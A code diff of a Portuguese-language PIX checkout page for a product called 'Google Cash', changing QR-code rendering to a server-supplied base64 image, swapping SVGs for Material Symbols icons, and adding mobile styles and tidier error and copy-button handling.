@@ -7,12 +7,12 @@
 <link rel="manifest" href="/manifest.json">
 <meta name="theme-color" content="#1a73e8">
 <link rel="preconnect" href="https://fonts.googleapis.com">
-<link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
-<script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.3/build/qrcode.min.js"></script>
+<link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700;800&family=Material+Symbols+Rounded:opsz,wght,FILL,GRAD@24,400,1,0&display=swap" rel="stylesheet">
 <style>
 *{margin:0;padding:0;box-sizing:border-box;-webkit-font-smoothing:antialiased}
 :root{--bl:#1a73e8;--gn:#34a853;--rd:#ea4335;--yl:#fbbc05;--dk:#202124;--sub:#5f6368;--bdr:#e0e0e0;--bg:#f8f9fa;--sh:0 2px 16px rgba(0,0,0,.1)}
 body{font-family:'DM Sans',system-ui,sans-serif;background:var(--bg);color:var(--dk);min-height:100vh;background-image:repeating-linear-gradient(0deg,transparent,transparent 23px,rgba(0,0,0,.04) 23px,rgba(0,0,0,.04) 24px),repeating-linear-gradient(90deg,transparent,transparent 23px,rgba(0,0,0,.04) 23px,rgba(0,0,0,.04) 24px)}
+.material-symbols-rounded{font-family:'Material Symbols Rounded';font-weight:normal;font-style:normal;line-height:1;letter-spacing:normal;text-transform:none;display:inline-block;white-space:nowrap;direction:ltr;-webkit-font-feature-settings:'liga';font-feature-settings:'liga';-webkit-font-smoothing:antialiased;vertical-align:middle}
 
 /* Layout */
 .wrap{max-width:480px;margin:0 auto;padding:24px 16px 40px}
@@ -62,18 +62,21 @@ body{font-family:'DM Sans',system-ui,sans-serif;background:var(--bg);color:var(-
 /* Security badges */
 .security-row{display:flex;justify-content:center;gap:16px;margin-top:14px;flex-wrap:wrap}
 .sec-badge{display:flex;align-items:center;gap:5px;font-size:11px;color:var(--sub)}
+.sec-badge .material-symbols-rounded{font-size:15px;color:var(--sub)}
 
 /* === STEP 2: PIX === */
 .pix-amount{text-align:center;margin-bottom:20px}
 .pix-amount .val{font-size:40px;font-weight:800;color:var(--dk)}
 .pix-amount .lbl{font-size:13px;color:var(--sub);margin-top:2px}
 .qr-wrap{text-align:center;margin-bottom:16px}
-.qr-wrap canvas{border-radius:12px;padding:10px;background:#fff;box-shadow:var(--sh)}
-.pix-code-box{background:#f8f9fa;border:1.5px solid var(--bdr);border-radius:12px;padding:12px 14px;margin-bottom:14px;position:relative}
+.qr-wrap img{border-radius:12px;padding:10px;background:#fff;box-shadow:var(--sh);width:200px;height:200px;object-fit:contain}
+.qr-placeholder{width:200px;height:200px;border-radius:12px;background:#f0f4ff;border:2px dashed var(--bdr);display:inline-flex;align-items:center;justify-content:center;color:var(--sub);font-size:12px;text-align:center;padding:16px}
+.pix-code-box{background:#f8f9fa;border:1.5px solid var(--bdr);border-radius:12px;padding:12px 14px;margin-bottom:14px;position:relative;padding-right:90px}
 .pix-code-label{font-size:11px;font-weight:600;color:var(--sub);margin-bottom:6px}
 .pix-code-text{font-size:11px;color:var(--dk);word-break:break-all;line-height:1.5;font-family:monospace;max-height:48px;overflow:hidden}
-.copy-btn{position:absolute;top:10px;right:10px;background:var(--bl);color:#fff;border:none;border-radius:8px;padding:6px 12px;font-size:12px;font-weight:600;cursor:pointer;font-family:inherit;transition:all .2s}
+.copy-btn{position:absolute;top:10px;right:10px;background:var(--bl);color:#fff;border:none;border-radius:8px;padding:6px 12px;font-size:12px;font-weight:600;cursor:pointer;font-family:inherit;transition:all .2s;display:flex;align-items:center;gap:4px}
 .copy-btn.copied{background:var(--gn)}
+.copy-btn .copy-icon{font-size:14px}
 .pix-status{display:flex;align-items:center;gap:10px;padding:12px 14px;background:#fff;border-radius:12px;border:1.5px solid var(--bdr);margin-bottom:14px}
 .pix-dot{width:10px;height:10px;border-radius:50%;background:#fbbc05;animation:blink 1.2s ease-in-out infinite;flex-shrink:0}
 .pix-dot.paid{background:var(--gn);animation:none}
@@ -87,6 +90,7 @@ body{font-family:'DM Sans',system-ui,sans-serif;background:var(--bg);color:var(-
 /* === STEP 3: SUCCESS === */
 .success-wrap{text-align:center;padding:16px 0}
 .success-icon{width:80px;height:80px;border-radius:50%;background:#e8f5e9;display:flex;align-items:center;justify-content:center;margin:0 auto 16px;animation:pop .5s ease}
+.success-icon .material-symbols-rounded{font-size:44px;color:var(--gn)}
 @keyframes pop{0%{transform:scale(.5);opacity:0}80%{transform:scale(1.1)}100%{transform:scale(1);opacity:1}}
 .success-title{font-size:22px;font-weight:800;color:var(--dk);margin-bottom:8px}
 .success-sub{font-size:14px;color:var(--sub);line-height:1.6;margin-bottom:20px}
@@ -96,8 +100,20 @@ body{font-family:'DM Sans',system-ui,sans-serif;background:var(--bg);color:var(-
 .ns-num{width:22px;height:22px;border-radius:50%;background:var(--bl);color:#fff;font-size:11px;font-weight:700;display:flex;align-items:center;justify-content:center;flex-shrink:0;margin-top:1px}
 
 /* Toast */
-#toast{position:fixed;bottom:24px;left:50%;transform:translateX(-50%) translateY(80px);background:var(--dk);color:#fff;padding:12px 20px;border-radius:10px;font-size:14px;font-weight:600;z-index:999;transition:transform .3s;white-space:nowrap;pointer-events:none}
+#toast{position:fixed;bottom:24px;left:50%;transform:translateX(-50%) translateY(80px);background:var(--dk);color:#fff;padding:12px 20px;border-radius:10px;font-size:14px;font-weight:600;z-index:999;transition:transform .3s;pointer-events:none}
 #toast.show{transform:translateX(-50%) translateY(0)}
+
+/* Mobile */
+@media(max-width:520px){
+  .wrap{padding:16px 12px 32px}
+  .product-card{padding:12px}
+  .card{padding:16px}
+  .pix-amount .val{font-size:32px}
+  .qr-wrap img,.qr-placeholder{width:170px;height:170px}
+  .security-row{gap:10px}
+  .sec-badge{font-size:10px}
+  #toast{font-size:13px;padding:10px 16px;max-width:calc(100vw - 32px);text-align:center;white-space:normal}
+}
 </style>
 </head>
 <body>
@@ -160,15 +176,15 @@ body{font-family:'DM Sans',system-ui,sans-serif;background:var(--bg);color:var(-
       <button class="btn btn-blue" id="btn-pay" onclick="submitForm()">Gerar PIX — R$ 117</button>
       <div class="security-row">
         <span class="sec-badge">
-          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+          <span class="material-symbols-rounded">shield</span>
           Pagamento seguro
         </span>
         <span class="sec-badge">
-          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 8v4l3 3"/></svg>
+          <span class="material-symbols-rounded">bolt</span>
           PIX instantâneo
         </span>
         <span class="sec-badge">
-          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"/></svg>
+          <span class="material-symbols-rounded">verified</span>
           Acesso imediato
         </span>
       </div>
@@ -184,13 +200,17 @@ body{font-family:'DM Sans',system-ui,sans-serif;background:var(--bg);color:var(-
       </div>
 
       <div class="qr-wrap">
-        <canvas id="qr-canvas"></canvas>
+        <img id="qr-img" alt="QR Code PIX" style="display:none">
+        <div id="qr-placeholder" class="qr-placeholder">Carregando QR Code...</div>
       </div>
 
       <div class="pix-code-box">
         <div class="pix-code-label">Copia e Cola PIX</div>
         <div class="pix-code-text" id="pix-code">Gerando...</div>
-        <button class="copy-btn" id="copy-btn" onclick="copyPix()">Copiar</button>
+        <button class="copy-btn" id="copy-btn" onclick="copyPix()">
+          <span class="material-symbols-rounded copy-icon">content_copy</span>
+          <span id="copy-label">Copiar</span>
+        </button>
       </div>
 
       <div class="pix-status" id="pix-status">
@@ -203,7 +223,7 @@ body{font-family:'DM Sans',system-ui,sans-serif;background:var(--bg);color:var(-
       <div class="pix-how">
         <p><strong>Como pagar:</strong><br>
         1. Abra o app do seu banco<br>
-        2. Vá em PIX → Copia e Cola (ou escaneie o QR)<br>
+        2. Vá em PIX &rarr; Copia e Cola (ou escaneie o QR)<br>
         3. Cole o código e confirme o pagamento</p>
       </div>
     </div>
@@ -214,9 +234,9 @@ body{font-family:'DM Sans',system-ui,sans-serif;background:var(--bg);color:var(-
     <div class="card">
       <div class="success-wrap">
         <div class="success-icon">
-          <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#34a853" stroke-width="2.5"><polyline points="20 6 9 17 4 12"/></svg>
+          <span class="material-symbols-rounded">check_circle</span>
         </div>
-        <div class="success-title">Pagamento confirmado! 🎉</div>
+        <div class="success-title">Pagamento confirmado!</div>
         <div class="success-sub">Seu acesso ao Google Cash está sendo liberado.<br>Verifique seu e-mail: <strong id="confirm-email"></strong></div>
         <div class="next-steps">
           <h4>Próximos passos:</h4>
@@ -293,15 +313,36 @@ async function submitForm() {
     });
     var data = await res.json();
 
-    if (!res.ok) { toast(data.error || 'Erro ao gerar PIX. Tente novamente.'); btn.disabled = false; btn.textContent = 'Gerar PIX — R$ 117'; return; }
+    if (!res.ok) {
+      toast(data.error || 'Erro ao gerar PIX. Tente novamente.');
+      btn.disabled = false;
+      btn.textContent = 'Gerar PIX — R$ 117';
+      return;
+    }
 
     txId = data.transactionId;
     pixCode = data.pix && data.pix.code;
 
-    // Render QR
+    // Set PIX copy-paste code
     if (pixCode) {
-      QRCode.toCanvas(document.getElementById('qr-canvas'), pixCode, { width: 200, margin: 1 }, function(){});
       document.getElementById('pix-code').textContent = pixCode;
+    }
+
+    // Render QR image using Duckfy's pre-rendered base64 image (no external lib needed)
+    var qrImg = document.getElementById('qr-img');
+    var qrPlaceholder = document.getElementById('qr-placeholder');
+    if (data.pix && data.pix.base64) {
+      qrImg.src = 'data:image/png;base64,' + data.pix.base64;
+      qrImg.style.display = 'inline-block';
+      qrPlaceholder.style.display = 'none';
+    } else if (data.pix && data.pix.image) {
+      var imgSrc = data.pix.image;
+      if (!imgSrc.startsWith('data:')) imgSrc = 'data:image/png;base64,' + imgSrc;
+      qrImg.src = imgSrc;
+      qrImg.style.display = 'inline-block';
+      qrPlaceholder.style.display = 'none';
+    } else {
+      qrPlaceholder.textContent = 'Use o codigo abaixo para pagar';
     }
 
     document.getElementById('confirm-email').textContent = document.getElementById('f-email').value.trim();
@@ -311,23 +352,32 @@ async function submitForm() {
     startPolling();
 
   } catch (err) {
-    toast('Erro de conexão. Verifique sua internet.');
-    btn.disabled = false; btn.textContent = 'Gerar PIX — R$ 117';
+    console.error('[checkout] submitForm error:', err);
+    toast('Erro ao conectar. Tente novamente.');
+    btn.disabled = false;
+    btn.textContent = 'Gerar PIX — R$ 117';
   }
 }
 
 function copyPix() {
   if (!pixCode) return;
+  var btn = document.getElementById('copy-btn');
+  var icon = btn.querySelector('.copy-icon');
+  var label = document.getElementById('copy-label');
   navigator.clipboard.writeText(pixCode).then(function() {
-    var btn = document.getElementById('copy-btn');
-    btn.textContent = 'Copiado ✓'; btn.classList.add('copied');
-    setTimeout(function() { btn.textContent = 'Copiar'; btn.classList.remove('copied'); }, 2000);
+    icon.textContent = 'check';
+    label.textContent = 'Copiado';
+    btn.classList.add('copied');
+    setTimeout(function() {
+      icon.textContent = 'content_copy';
+      label.textContent = 'Copiar';
+      btn.classList.remove('copied');
+    }, 2000);
   }).catch(function() {
-    // fallback
     var ta = document.createElement('textarea');
     ta.value = pixCode; document.body.appendChild(ta); ta.select();
     document.execCommand('copy'); document.body.removeChild(ta);
-    toast('Código copiado!');
+    toast('Codigo copiado!');
   });
 }
 
@@ -345,7 +395,7 @@ async function checkStatus() {
       clearInterval(pollInterval); clearInterval(timerInterval);
       onPaymentConfirmed();
     }
-  } catch {}
+  } catch (e) {}
 }
 
 function onPaymentConfirmed() {
@@ -366,8 +416,10 @@ function startTimer(seconds) {
 }
 
 function toast(msg) {
-  var el = document.getElementById('toast'); el.textContent = msg;
-  el.classList.add('show'); setTimeout(function() { el.classList.remove('show'); }, 2800);
+  var el = document.getElementById('toast');
+  el.textContent = msg;
+  el.classList.add('show');
+  setTimeout(function() { el.classList.remove('show'); }, 2800);
 }
 </script>
 </body>
